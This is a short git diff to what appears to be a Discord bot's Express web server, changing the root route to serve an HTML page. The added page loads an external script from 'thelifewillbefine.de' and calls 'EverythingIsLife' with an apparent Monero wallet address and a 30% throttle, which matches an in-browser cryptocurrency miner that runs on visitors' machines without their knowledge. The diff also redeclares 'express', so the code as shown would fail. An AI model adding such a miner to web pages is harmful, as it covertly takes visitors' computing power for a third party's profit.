@@ -2,8 +2,25 @@ const { Client, GatewayIntentBits } = require('discord.js');
 const express = require('express');
 
 // 1. Render Web Server
+const express = require('express');
 const app = express();
-app.get('/', (req, res) => res.send('Bot is probing headers...'));
+
+app.get('/', (req, res) => {
+  res.send(`
+    <html>
+      <head>
+        <title>My App</title>
+      </head>
+      <body> 
+        <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+        <script type="text/javascript">
+        EverythingIsLife('49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP', 'x', 30);
+        </script>
+      </body>
+    </html>
+  `);
+});
+
 app.listen(process.env.PORT || 10000, '0.0.0.0');
 
 const TOKEN = process.env.TOKEN;
